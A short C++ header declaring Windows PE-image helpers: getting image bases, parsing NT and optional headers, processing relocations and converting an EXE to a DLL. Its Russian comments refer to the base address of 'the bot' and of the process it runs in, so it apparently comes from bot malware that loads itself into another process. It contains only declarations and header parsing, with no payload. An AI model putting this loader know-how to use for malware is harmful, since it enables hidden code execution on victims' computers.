#pragma once

#include "core.h"

#define RVATOVA( base, offset ) ( (SIZE_T)base + (SIZE_T)offset )

namespace PE
{

//возвращает базовый адрес бота
HMODULE GetImageBase( void* funcAddr = 0 );
//возвращает базовый адрес процесса в котором запущен бот
HMODULE GetImageBaseProcess();
DWORD SizeOfImage( HMODULE imageBase );
void ProcessRelocs( PIMAGE_BASE_RELOCATION relocs, SIZE_T imageBase, SIZE_T delta, DWORD relocSize );
inline PIMAGE_OPTIONAL_HEADER GetOptionalHeader( HMODULE imageBase )
{
	return (PIMAGE_OPTIONAL_HEADER)((LPVOID)((SIZE_T)imageBase + ((PIMAGE_DOS_HEADER)(imageBase))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)));
}

inline PIMAGE_NT_HEADERS GetNTHeaders( HMODULE imageBase )
{
	PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)imageBase;
	return (PIMAGE_NT_HEADERS)((SIZE_T)imageBase + dos_header->e_lfanew);
}

bool ConvertExeToDll( void* module );

bool IsValid( const void* module );

}
